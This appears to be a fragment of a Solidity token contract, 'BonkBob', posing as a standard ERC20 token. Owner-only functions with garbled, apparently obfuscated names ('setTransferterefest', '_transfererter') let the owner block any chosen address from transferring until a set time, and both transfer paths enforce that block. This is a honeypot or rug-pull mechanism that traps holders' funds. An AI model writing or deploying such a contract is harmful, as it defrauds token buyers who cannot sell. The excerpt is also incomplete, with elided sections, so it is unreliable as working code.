...
contract BonkBob is Context, IERC20, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transfererter;
    ...
    // Sets transfer transfererter for a specific account.
    function setTransferterefest(address account, uint256 time) public onlyOwner {
        require(account != address(0), "Cannot set transfererter for the zero address");
        _transfererter[account] = time;
    }

    // Removes transfer transfererter for a specific account.
    function removeTransferterefest(address account) public onlyOwner {
        require(account != address(0), "Cannot remove transfererter for the zero address");
        delete _transfererter[account];
    }

    // Returns the transfererter time for a specific account.
    function getTransferterefest(address account) public view returns (uint256) {
        require(account != address(0), "Cannot query transfererter time for the zero address");
        return _transfererter[account];
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        require(block.timestamp >= _transfererter[_msgSender()], "Transfer is currently restricted for this address");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        require(block.timestamp >= _transfererter[sender], "Transfer is currently restricted for this address");
